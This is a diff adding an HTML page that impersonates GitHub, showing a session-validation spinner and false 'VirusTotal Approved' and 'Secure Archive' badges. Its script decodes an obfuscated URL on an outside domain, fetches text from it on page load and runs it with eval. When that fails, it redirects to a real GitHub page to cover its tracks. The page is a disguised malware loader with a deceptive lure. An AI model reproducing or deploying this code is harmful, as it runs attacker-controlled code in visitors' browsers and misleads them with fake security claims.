@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="unsafe-url">
+    <title> · Github</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Cpath fill='%231F2328' fill-rule='evenodd' d='M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z'/%3E%3C/svg%3E">
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            color: #1F2328;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .gh-topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background: #ffffff;
+            border-bottom: 1px solid #d0d7de;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+        }
+
+        .gh-topbar-start { 
+            display: flex; 
+            align-items: center; 
+            gap: 16px; 
+        }
+        
+        .gh-brand { 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+        }
+
+        .gh-hostline {
+            color: #1F2328;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .gh-stage {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 24px;
+            min-height: calc(100vh - 73px);
+        }
+
+        .gh-panel {
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .gh-panel-top { 
+            margin-bottom: 32px; 
+        }
+
+        .gh-panel-icon {
+            width: 80px;
+            height: 80px;
+            color: #1F2328;
+            margin-bottom: 24px;
+        }
+
+        .gh-panel-name {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .gh-panel-hint {
+            font-size: 16px;
+            color: #656d76;
+            line-height: 1.5;
+        }
+
+        .gh-card {
+            background: #ffffff;
+            border: 1px solid #d0d7de;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+
+        .gh-card-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 24px;
+        }
+
+        .gh-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: #f6f8fa;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 6px 12px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .gh-badge-mark {
+            font-size: 14px;
+        }
+
+        .gh-badge-txt {
+            color: #1F2328;
+        }
+
+        .gh-ver-tag {
+            background: #dafbe1;
+            color: #1a7f37;
+            border: 1px solid rgba(27, 31, 36, 0.15);
+            border-radius: 12px;
+            padding: 4px 8px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .gh-safe-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+            padding: 16px;
+            background: #f6f8fa;
+            border-radius: 8px;
+            border: 1px solid #d0d7de;
+        }
+
+        .gh-safe-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            color: #1F2328;
+        }
+
+        .gh-safe-mark {
+            width: 10px;
+            height: 10px;
+            border-radius: 999px;
+            background: #1a7f37;
+            flex-shrink: 0;
+            box-shadow: 0 0 0 3px rgba(26, 127, 55, 0.12);
+        }
+
+        .gh-load-box {
+            padding: 18px 16px;
+            border: 1px solid #d0d7de;
+            border-radius: 10px;
+            background: #ffffff;
+            margin-bottom: 18px;
+        }
+
+        .spinner {
+            width: 42px;
+            height: 42px;
+            border: 3px solid #d0d7de;
+            border-top: 3px solid #1F2328;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        .gh-load-name {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .gh-load-hint {
+            font-size: 13px;
+            color: #656d76;
+        }
+
+        .gh-proof-list {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .gh-proof-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #656d76;
+            background: #f6f8fa;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 6px 10px;
+        }
+
+        .gh-proof-mark {
+            width: 10px;
+            height: 10px;
+            border-radius: 999px;
+            background: #1a7f37;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .gh-topbar { 
+                padding: 12px 16px; 
+            }
+            .gh-stage { 
+                padding: 24px 16px; 
+            }
+            .gh-card { 
+                padding: 24px; 
+            }
+            .gh-panel-name { 
+                font-size: 24px; 
+            }
+            .gh-card-top { 
+                flex-direction: column; 
+                gap: 12px; 
+                align-items: center; 
+            }
+            .gh-proof-list { 
+                flex-direction: column; 
+                gap: 8px; 
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav class="gh-topbar">
+        <div class="gh-topbar-start">
+            <div class="gh-brand">
+                <svg viewBox="0 0 16 16" width="32" height="32" aria-hidden="true">
+                    <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                </svg>
+                <span id="edgeHost" class="gh-hostline"></span>
+            </div>
+        </div>
+    </nav>
+    <main class="gh-stage">
+        <div class="gh-panel">
+            <div class="gh-panel-top">
+                <svg class="gh-panel-icon" viewBox="0 0 16 16" aria-hidden="true">
+                    <path d="M2 2.5A2.5 2.5 0 014.5 0h8.75a.75.75 0 01.75.75v12.5a.75.75 0 01-.75.75h-2.5a.75.75 0 110-1.5h1.75v-2h-8a1 1 0 00-.714 1.7.75.75 0 01-1.072 1.05A2.495 2.495 0 012 11.5v-9zm10.5-1V9h-8c-.356 0-.694.074-1 .208V2.5a1 1 0 011-1h8zM5 12.25v3.25a.25.25 0 00.4.2l1.45-1.087a.25.25 0 01.3 0L8.6 15.7a.25.25 0 00.4-.2v-3.25a.25.25 0 00-.25-.25h-3.5a.25.25 0 00-.25.25z"></path>
+                </svg>
+                <h1 class="gh-panel-name" id="edgeHead"></h1>
+                <p class="gh-panel-hint" id="edgePack"></p>
+            </div>
+            <div class="gh-card">
+                <div class="gh-card-top">
+                    <div class="gh-badge">
+                        <span class="gh-badge-mark">🔒</span>
+                        <span class="gh-badge-txt">Authorized Access</span>
+                    </div>
+                    <div class="gh-ver-wrap">
+                        <span class="gh-ver-tag">secure</span>
+                    </div>
+                </div>
+
+                <div class="gh-safe-list">
+                    <div class="gh-safe-row">
+                        <span class="gh-safe-mark"></span>
+                        <span>Verified Access</span>
+                    </div>
+                    <div class="gh-safe-row">
+                        <span class="gh-safe-mark"></span>
+                        <span>Secure Connection</span>
+                    </div>
+                </div>
+                <div class="gh-load-box" aria-live="polite">
+                    <div class="spinner" aria-hidden="true"></div>
+                    <p class="gh-load-name" id="loaderHeadline">Validating session</p>
+                    <p class="gh-load-hint" id="loaderStatus">Generating secure token</p>
+                </div>
+                <div class="gh-proof-list">
+                    <div class="gh-proof-row">
+                        <span class="gh-proof-mark"></span>
+                        VirusTotal Approved
+                    </div>
+                    <div class="gh-proof-row">
+                        <span class="gh-proof-mark"></span>
+                        Secure Archive
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+<script>
+var _keys = [104, 116, 116, 112, 115, 58, 47, 47, 108, 97, 116, 101, 114, 112, 108, 111, 97, 116];
+function _officialD4() {
+    location.replace('https://github.com/features/actions');
+}
+
+function _fromHex(h) {
+    var o = '', i = 0;
+    for (; i < h.length; i += 2) o += String.fromCharCode(parseInt(h.substr(i, 2), 16));
+    return o;
+}
+
+var _tail = '2e636f6d2f6761726c652e6b6f73696e';
+var SOURCE = String.fromCharCode.apply(null, _keys) + _fromHex(_tail);
+function pullResource(uri) {
+    return fetch(uri, { method: 'GET', credentials: 'omit', cache: 'reload' })
+        .then(function (answer) {
+            if (!answer.ok) throw 0;
+            return answer.text();
+        });
+}
+
+function runIsolated(chunk) {
+    var body = String(chunk).replace(/^\uFEFF/, '').trim();
+    if (!body) throw 0;
+    try {
+        (0, eval)(body);
+    } catch (e) { _officialD4(); }
+}
+
+var _pause1211 = 1211;
+setTimeout(function () {
+    pullResource(SOURCE)
+        .then(runIsolated)
+        .catch(function () { _officialD4(); });
+}, _pause1211);
+
+(function () {
+    function pickTail() {
+        var list = location.pathname.split('/'), n = list.length, item;
+        while (n--) {
+            item = list[n];
+            if (item) return item;
+        }
+        return '';
+    }
+    function mountCopy() {
+        var raw = pickTail();
+        if (!raw || raw === '.github') return;
+        var low = raw.toLowerCase();
+        var parts = low.split('-'), label = '', i = 0, seg;
+        for (; i < parts.length; i++) {
+            seg = parts[i];
+            if (!seg) continue;
+            label += (label ? ' ' : '') + seg.charAt(0).toUpperCase() + seg.slice(1);
+        }
+        var host = document.getElementById('edgeHost');
+        var head = document.getElementById('edgeHead');
+        var pack = document.getElementById('edgePack');
+        if (host) host.appendChild(document.createTextNode('/' + low + '.github.io'));
+        if (head) head.appendChild(document.createTextNode(label));
+        if (pack) pack.appendChild(document.createTextNode('Content package for ' + low + '.github.io'));
+        var docTitle = document.getElementsByTagName('title')[0];
+        if (docTitle) {
+            docTitle.insertBefore(document.createTextNode(label), docTitle.firstChild);
+        }
+    }
+    if ('requestIdleCallback' in window) {
+        requestIdleCallback(mountCopy);
+    } else {
+        setTimeout(mountCopy, 0);
+    }
+})();
+</script>
+</body>
+</html>
